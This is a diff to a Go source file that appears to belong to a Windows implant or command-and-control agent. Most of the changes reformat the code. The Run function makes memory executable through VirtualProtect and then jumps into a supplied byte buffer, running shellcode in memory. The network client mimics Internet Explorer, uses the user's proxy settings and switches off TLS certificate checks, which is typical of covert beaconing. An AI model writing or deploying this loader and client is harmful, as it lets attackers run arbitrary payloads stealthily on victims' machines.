@@ -15,18 +15,27 @@ import (
 	"unsafe"
 )
 
+const (
+	PAGE_NOACCESS          = 0x01
+	PAGE_READONLY          = 0x02
+	PAGE_READWRITE         = 0x04
+	PAGE_WRITECOPY         = 0x08
+	PAGE_EXECUTE_READ      = 0x20
+	PAGE_EXECUTE_READWRITE = 0x40
+	PAGE_EXECUTE_WRITECOPY = 0x80
+)
+
 var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
 
-type userAgentTransport struct{
+type userAgentTransport struct {
 	userAgent string
-	rt http.RoundTripper
+	rt        http.RoundTripper
 }
 
-func(t *userAgentTransport) RoundTrip(r *http.Request)(*http.Response, error){
+func (t *userAgentTransport) RoundTrip(r *http.Request) (*http.Response, error) {
 	r.Header.Set("User-Agent", t.userAgent)
 	return t.rt.RoundTrip(r)
 }
-
 
 type WINHTTP_CURRENT_USER_IE_PROXY_CONFIG struct {
 	fAutoDetect       bool
@@ -47,8 +56,7 @@ func GoWString(s *uint16) string {
 	return string(utf16.Decode(p[:sz:sz]))
 }
 
-
-func getProxy()(url.URL, error){
+func getProxy() (url.URL, error) {
 	winHttpApi := syscall.NewLazyDLL("Winhttp.dll")
 	WinHttpGetDefaultProxyConfiguration := winHttpApi.NewProc("WinHttpGetIEProxyConfigForCurrentUser")
 	out := WINHTTP_CURRENT_USER_IE_PROXY_CONFIG{}
@@ -56,68 +64,71 @@ func getProxy()(url.URL, error){
 	proxyServer := GoWString(out.lpszProxy)
 	if proxyServer != "" {
 		proxyServer := GoWString(out.lpszProxy)
-		parsedUrl, err := url.Parse("http://"+proxyServer)
-		if err == nil{
+		parsedUrl, err := url.Parse("http://" + proxyServer)
+		if err == nil {
 			return *parsedUrl, nil
 		}
 	}
 	return url.URL{}, errors.New("No Proxy Found")
 }
 
-func newClient()*http.Client{
+func newClient() *http.Client {
 	proxy, err := getProxy()
-	if err == nil{
+	if err == nil {
 		client := &http.Client{
 			Transport: &userAgentTransport{
 				userAgent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
 				rt: &http.Transport{
 					DisableKeepAlives: true,
-					Proxy: http.ProxyURL(&proxy),
-					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-					DialContext:(&net.Dialer{
-						Timeout:   3 * time.Second,
+					Proxy:             http.ProxyURL(&proxy),
+					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+					DialContext: (&net.Dialer{
+						Timeout: 3 * time.Second,
 					}).DialContext,
-					TLSHandshakeTimeout:   10 * time.Second,
+					TLSHandshakeTimeout: 10 * time.Second,
 				},
 			},
 		}
 		return client
-	}else{
+	} else {
 		client := &http.Client{
 			Transport: &userAgentTransport{
 				userAgent: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
 				rt: &http.Transport{
 					DisableKeepAlives: true,
-					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-					DialContext:(&net.Dialer{
-						Timeout:   3 * time.Second,
+					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+					DialContext: (&net.Dialer{
+						Timeout: 3 * time.Second,
 					}).DialContext,
-					TLSHandshakeTimeout:   10 * time.Second,
+					TLSHandshakeTimeout: 10 * time.Second,
 				},
-
 			},
-
 		}
 		return client
 	}
 
 }
 
-
 func Run(executable []byte) {
-	//Found example of executing shellcode in memory here: https://github.com/brimstone/go-shellcode
+
+	//Found example of executing code in memory here: https://github.com/brimstone/go-shellcode
 	f := func() {}
 	var oldfperms uint32
-	virtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms))
+	var oldexecutableperms uint32
+	virtualProtect(unsafe.Pointer(&f), len(executable), PAGE_EXECUTE_READWRITE, &oldfperms)
+	virtualProtect(unsafe.Pointer(&executable), len(executable), PAGE_EXECUTE_READWRITE, &oldexecutableperms)
 	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&executable))
-	var oldshellcodeperms uint32
-	virtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&executable))), uintptr(len(executable)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms))
 	f()
+
 }
 
-func virtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer){
-	ret, _, _ := procVirtualProtect.Call(uintptr(lpAddress), uintptr(dwSize), uintptr(flNewProtect), uintptr(lpflOldProtect))
-	if ret <= 0{
+func virtualProtect(lpAddress unsafe.Pointer, dwSize int, flNewProtect uint32, lpflOldProtect *uint32) {
+	address := uintptr(unsafe.Pointer(*(**uintptr)(lpAddress)))
+	size := uintptr(dwSize)
+	newProtections := uintptr(flNewProtect)
+	oldProtections := uintptr(unsafe.Pointer(lpflOldProtect))
+	ret, _, _ := procVirtualProtect.Call(address, size, newProtections, oldProtections)
+	if ret <= 0 {
 		panic("Call to VirtualProtect failed!")
 	}
 }
